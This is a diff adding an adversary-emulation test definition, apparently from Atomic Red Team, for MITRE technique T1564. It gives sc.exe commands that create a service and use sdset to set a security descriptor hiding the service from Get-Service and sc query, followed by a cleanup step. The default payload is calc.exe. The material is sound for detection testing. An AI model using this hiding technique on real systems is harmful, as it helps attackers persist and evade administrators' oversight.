@@ -1,0 +1,58 @@
+{
+  "id": "333c7de0-6fbe-42aa-ac2b-c7e40b18246a",
+  "name": "Create and Hide a Service with sc.exe",
+  "description": "The following technique utilizes sc.exe and sdset to change the security descriptor of a service and \"hide\" it from Get-Service or sc query.\n\nUpon successful execution, sc.exe creates a new service changes the security descriptor.\n\nhttps://twitter.com/Alh4zr3d/status/1580925761996828672\nhttps://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "4944f43d-8e70-4464-94af-e239d20fb2fa",
+      "type": "execute-command",
+      "data": {
+        "command": "sc.exe create #{service_name} binPath= \"#{executable_command}\"\nsc sdset #{service_name} \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5bcc3831-92c0-4635-9a70-d5e1c8946283",
+      "type": "execute-command",
+      "data": {
+        "command": "sc sdset #{service_name} \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\nsc.exe delete #{service_name}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "4944f43d-8e70-4464-94af-e239d20fb2fa",
+      "p": "on-success",
+      "o": "5bcc3831-92c0-4635-9a70-d5e1c8946283"
+    },
+    {
+      "s": "4944f43d-8e70-4464-94af-e239d20fb2fa",
+      "p": "on-failure",
+      "o": "5bcc3831-92c0-4635-9a70-d5e1c8946283"
+    }
+  ],
+  "tags": [
+    "T1564",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "service_name",
+      "type": "string",
+      "description": "Name of service to create",
+      "value": "AtomicService"
+    },
+    {
+      "name": "executable_command",
+      "type": "string",
+      "description": "Command to execute as a service",
+      "value": "C:\\Windows\\System32\\calc.exe"
+    }
+  ]
+}
